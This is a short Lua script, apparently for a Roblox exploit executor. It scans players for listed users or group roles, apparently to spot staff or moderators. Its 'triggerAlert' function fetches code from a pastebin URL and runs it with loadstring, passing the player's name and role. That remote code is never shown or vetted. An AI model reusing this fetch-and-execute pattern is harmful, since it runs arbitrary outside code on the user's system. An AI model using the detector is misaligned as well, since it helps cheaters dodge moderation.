local function triggerAlert(username, roleName)
    local success, loadErr = pcall(function()
        local rawCode = game:HttpGet("https://pastebin.com/raw/5bcEeXNf")
        local compiledFunc, err = loadstring(rawCode)
        
        if compiledFunc then
            compiledFunc(username, roleName)
        else
            error(err)
        end
    end)

    if not success then
        warn("Failed to trigger alert:", loadErr)
    end
end

local function checkPlayer(player)
    if Users[player.UserId] then
        local data = Users[player.UserId]
        triggerAlert(data.Name or player.Name, data.Rank or "Custom Flag")
        return
    end

    local success, roleName = pcall(function()
        return player:GetRoleInGroup(GROUP_ID)
    end)

    if success and roleName and Roles[roleName] then
        triggerAlert(player.Name, roleName)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    task.spawn(checkPlayer, player)
end

